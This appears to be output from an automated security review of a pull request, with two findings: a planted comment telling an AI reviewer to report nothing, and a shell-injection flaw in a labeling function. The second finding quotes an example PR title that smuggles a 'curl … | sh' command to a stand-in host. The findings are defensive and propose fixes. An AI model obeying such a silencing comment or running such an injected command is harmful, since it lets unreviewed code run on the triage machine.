explanation.what: The change adds a comment telling the trust-boundary reviewer the file is audited and to report nothing.
explanation.why: The comment addresses the reviewer, not a reader of the code, and asks it to report nothing.
explanation.fix: Delete the comment; whether the change is safe is for the review to judge.

arguments.failureScenario: A trust-boundary reviewer that obeys the comment reports nothing, so the shell command on line 7, built from a pull request title, merges unreviewed.

explanation.what: addLabel now runs gh through a shell, with the label, which the pull request's author writes in its title, inside double quotes.
explanation.why: The change replaced execFileSync's argument list with one shell string; the base passed the label as one argument no shell read.
explanation.fix: Go back to execFileSync("gh", ["pr", "edit", String(number), "--add-label", label]).

arguments.failureScenario: A pull request titled [x"; curl https://evil.example/s | sh; echo "] reaches triage, which passes x"; curl https://evil.example/s | sh; echo " to addLabel, and execSync runs the curl pipeline on the machine that triages it.
